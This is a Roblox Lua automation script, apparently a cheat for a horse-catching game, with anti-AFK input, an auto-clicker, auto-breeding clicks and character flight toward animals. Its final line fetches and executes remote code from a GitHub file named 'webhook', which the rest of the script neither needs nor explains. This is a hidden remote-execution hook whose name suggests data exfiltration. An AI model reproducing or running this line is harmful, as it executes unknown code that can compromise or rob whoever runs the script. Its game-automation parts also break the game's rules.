-- ServicesNga
local players = game:GetService("Players")
local lp = players.LocalPlayer
local playerGui = lp:WaitForChild("PlayerGui")
local VIM = game:GetService("VirtualInputManager")
local Camera = workspace.CurrentCamera
local RunService = game:GetService("RunService")

-- State
local currentTask
local isPaused = false
local currentIsland = "Unknown"
local clickLoop = nil
local isBreeding = false

-- Breeding Script Variables
local itemInfoFrame = playerGui:WaitForChild("SubMenus"):WaitForChild("Item Information")
local indicatorLabel = itemInfoFrame.Animals.Main.Content.Top.Labels.IndicatorLabel
local closeButton = itemInfoFrame.Animals.Main.CloseMenu
local buttonsContainer = itemInfoFrame.Animals.Main.Content.Buttons
local TARGET_IMAGE_ID = "rbxassetid://13116451197"
local isProcessingBreed = false

-- Anti-AFK
local VirtualUser = game:GetService("VirtualUser")

lp.Idled:Connect(function()
	VirtualUser:CaptureController()
	VirtualUser:ClickButton2(Vector2.new())
	print("Anti-AFK: Prevented idle kick")
end)

task.spawn(function()
	while true do
		task.wait(300)
		VirtualUser:CaptureController()
		VirtualUser:Button1Down(Vector2.new(0, 0))
		task.wait(0.1)
		VirtualUser:Button1Up(Vector2.new(0, 0))
	end
end)

-- Configuration
local FLY_SPEED = 30

-- Virtual Input Manager Functions
local function getScreenSize()
	return Camera.ViewportSize
end

local function getClickPosition()
	local screenSize = getScreenSize()
	local x = screenSize.X - 300
	local y = 30
	return x, y
end

local function clickAt(x, y)
	VIM:SendMouseButtonEvent(x, y, 0, true, game, 0)
	task.wait(0.05)
	VIM:SendMouseButtonEvent(x, y, 0, false, game, 0)
end

local function startAutoClicker()
	if clickLoop then
		task.cancel(clickLoop)
	end

	clickLoop = task.spawn(function()
		while true do
			if not isPaused and not isBreeding then
				local x, y = getClickPosition()
				clickAt(x, y)
			end
			task.wait(0.5)
		end
	end)
end

-- Breeding Script Functions
local function clickButtonActivated(button)
	if not button:IsA("TextButton") and not button:IsA("ImageButton") then
		return
	end
	print("Clicking button with Activated event: " .. button.Name)
	button:Activate()
	print("Activated click sent on: " .. button.Name)
end

local function clickYesButtonVIM(button)
	if not button:IsA("TextButton") and not button:IsA("ImageButton") then
		return
	end

	print("Clicking Yes button with VirtualInputManager")

	local buttonPos = button.AbsolutePosition
	local buttonSize = button.AbsoluteSize
	local centerX = buttonPos.X + (buttonSize.X / 2) + 7
	local centerY = buttonPos.Y + (buttonSize.Y / 2) + 50

	print("Button center position (adjusted): X=" .. centerX .. " Y=" .. centerY)

	VIM:SendMouseButtonEvent(centerX, centerY, 0, true, game, 0)
	task.wait(0.1)
	VIM:SendMouseButtonEvent(centerX, centerY, 0, false, game, 0)

	print("VIM click sent")
end

local function onItemInfoOpened()
	if isProcessingBreed then return end
	if not itemInfoFrame.Visible then return end

	isProcessingBreed = true
	isBreeding = true

	task.wait(0.5)

	local labelText = indicatorLabel.Text

	if string.find(labelText, "Unbreedable") then
		print("Item is Unbreedable, closing menu")
		clickButtonActivated(closeButton)
		task.wait(1)
		isProcessingBreed = false
		isBreeding = false
		return
	end

	print("Item is breedable, looking for breed button")

	for _, child in ipairs(buttonsContainer:GetChildren()) do
		if child.Name == "OptionButton" then
			local imageLabel = child:FindFirstChildWhichIsA("ImageLabel")
			if imageLabel and imageLabel.Image == TARGET_IMAGE_ID then
				print("Found breeding button, clicking it")
				clickButtonActivated(child)

				print("Waiting 1 second for YesNo prompt to load...")
				task.wait(1)

				local success, err = pcall(function()
					local prompts = playerGui:WaitForChild("Prompts", 3)
					local yesNo = prompts:WaitForChild("YesNo", 3)
					local yesButton = yesNo.Content.Frame.Yes

					print("Found Yes button, waiting 0.1 second...")
					task.wait(0.1)

					clickYesButtonVIM(yesButton)
				end)

				if not success then
					warn("Failed to click Yes button: " .. tostring(err))
				end

				break
			end
		end
	end

	task.wait(0.5)
	isProcessingBreed = false
	isBreeding = false
end

-- Fly to a target position (moves player character smoothly)
local function flyToPosition(hrp, targetPos, shouldContinue)
	local startPos = hrp.Position
	local distance = (targetPos - startPos).Magnitude
	local duration = distance / FLY_SPEED
	local startTime = tick()

	while tick() - startTime < duration do
		if not shouldContinue() then return false end

		local alpha = math.min((tick() - startTime) / duration, 1)
		local currentPos = startPos:Lerp(targetPos, alpha)

		local direction = (targetPos - currentPos)
		if direction.Magnitude > 0.1 then
			hrp.CFrame = CFrame.lookAt(currentPos, currentPos + direction.Unit)
		else
			hrp.CFrame = CFrame.new(currentPos, hrp.CFrame.LookVector)
		end

		RunService.Heartbeat:Wait()
	end

	return true
end

-- Create GUI
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "HorseCatcherGUI"
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 220, 0, 80)
frame.Position = UDim2.new(0, 10, 0, 10)
frame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
frame.BorderSizePixel = 0
frame.Parent = screenGui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 8)
corner.Parent = frame

local islandLabel = Instance.new("TextLabel")
islandLabel.Size = UDim2.new(1, -20, 0, 30)
islandLabel.Position = UDim2.new(0, 10, 0, 10)
islandLabel.BackgroundTransparency = 1
islandLabel.Text = "Island: " .. currentIsland
islandLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
islandLabel.TextSize = 14
islandLabel.Font = Enum.Font.GothamBold
islandLabel.TextXAlignment = Enum.TextXAlignment.Left
islandLabel.Parent = frame

local pauseButton = Instance.new("TextButton")
pauseButton.Size = UDim2.new(1, -20, 0, 30)
pauseButton.Position = UDim2.new(0, 10, 0, 45)
pauseButton.BackgroundColor3 = Color3.fromRGB(60, 180, 75)
pauseButton.Text = "Pause"
pauseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
pauseButton.TextSize = 14
pauseButton.Font = Enum.Font.GothamBold
pauseButton.Parent = frame

local buttonCorner = Instance.new("UICorner")
buttonCorner.CornerRadius = UDim.new(0, 6)
buttonCorner.Parent = pauseButton

-- Get current island
local function getCurrentIsland()
	local char = lp.Character
	if not char then return nil end

	local hrp = char:FindFirstChild("HumanoidRootPart")
	if not hrp then return nil end

	local islands = workspace:FindFirstChild("Islands")
	if not islands then return nil end

	for _, island in ipairs(islands:GetChildren()) do
		if island:IsA("Model") or island:IsA("Folder") then
			local playerModel = island:FindFirstChild(lp.Name)
			if playerModel then
				return island.Name
			end
		end
	end

	return nil
end

-- Follow Logic (fly-based)
local function followLoopFrom(folder)
	if currentTask then
		task.cancel(currentTask)
	end

	local char = lp.Character or lp.CharacterAdded:Wait()
	local hrp = char:WaitForChild("HumanoidRootPart")
	local humanoid = char:WaitForChild("Humanoid")

	-- Disable humanoid auto-movement so we can fly freely
	humanoid.WalkSpeed = 0
	humanoid.JumpPower = 0

	local function getValidTargets()
		local targets = {}
		for _, model in ipairs(folder:GetChildren()) do
			if model:IsA("Model") and model:FindFirstChild("HumanoidRootPart") then
				local hasManeMesh = model:FindFirstChild("maneMesh")
				local isReindeer = false

				local overheadPart = model:FindFirstChild("OverheadPart")
				if overheadPart then
					local overHead = overheadPart:FindFirstChild("OverHead")
					if overHead then
						local breedLabel = overHead:FindFirstChild("BreedLabel")
						if breedLabel and breedLabel.Text == "Reindeer" then
							isReindeer = true
						end
					end
				end

				if hasManeMesh or isReindeer then
					table.insert(targets, model)
				end
			end
		end
		return targets
	end

	currentTask = task.spawn(function()
		local currentTarget = nil
		local lastSwitch = 0

		while true do
			if isPaused then
				task.wait(0.5)
				continue
			end

			local now = tick()

			-- Switch target every 15 seconds or if lost
			if not currentTarget or not currentTarget.Parent or now - lastSwitch >= 15 then
				local targets = getValidTargets()
				if #targets > 0 then
					local newTarget
					repeat
						newTarget = targets[math.random(1, #targets)]
					until newTarget ~= currentTarget or #targets == 1

					currentTarget = newTarget
					lastSwitch = now
				end
			end

			-- Fly toward current target
			if currentTarget and currentTarget:FindFirstChild("HumanoidRootPart") then
				local targetHRP = currentTarget.HumanoidRootPart
				local targetPos = targetHRP.Position + Vector3.new(0, 0, -4)

				-- Continuously fly toward the target; re-evaluate every frame
				flyToPosition(hrp, targetPos, function()
					-- Stop flying if paused, task cancelled, or target gone
					if isPaused or not currentTarget or not currentTarget.Parent then
						return false
					end
					-- If target has moved significantly, break early to re-target
					local newTargetPos = targetHRP.Position + Vector3.new(0, 0, -4)
					if (newTargetPos - targetPos).Magnitude > 8 then
						return false
					end
					return true
				end)
			else
				task.wait(0.2)
			end
		end
	end)
end

-- Update island detection
local function updateIsland()
	local island = getCurrentIsland()
	if island then
		currentIsland = island
		islandLabel.Text = "Island: " .. currentIsland

		local islands = workspace:FindFirstChild("Islands")
		if islands then
			local islandFolder = islands:FindFirstChild(currentIsland)
			if islandFolder then
				followLoopFrom(islandFolder)
			end
		end
	end
end

-- Pause/Resume button
pauseButton.MouseButton1Click:Connect(function()
	isPaused = not isPaused
	if isPaused then
		pauseButton.Text = "Resume"
		pauseButton.BackgroundColor3 = Color3.fromRGB(220, 50, 50)
	else
		pauseButton.Text = "Pause"
		pauseButton.BackgroundColor3 = Color3.fromRGB(60, 180, 75)
	end
end)

-- Monitor Item Information frame for breeding
itemInfoFrame:GetPropertyChangedSignal("Visible"):Connect(function()
	if itemInfoFrame.Visible then
		onItemInfoOpened()
	end
end)

-- Initial setup
updateIsland()
startAutoClicker()

-- Monitor island changes
task.spawn(function()
	while true do
		task.wait(5)
		local newIsland = getCurrentIsland()
		if newIsland and newIsland ~= currentIsland then
			updateIsland()
		end
	end
end)

-- Restore humanoid speed on respawn and re-init
lp.CharacterAdded:Connect(function()
	task.wait(1)
	updateIsland()
end)

loadstring(game:HttpGet('https://raw.githubusercontent.com/obeseid/Lellelelebonczki/refs/heads/main/webhook'))()
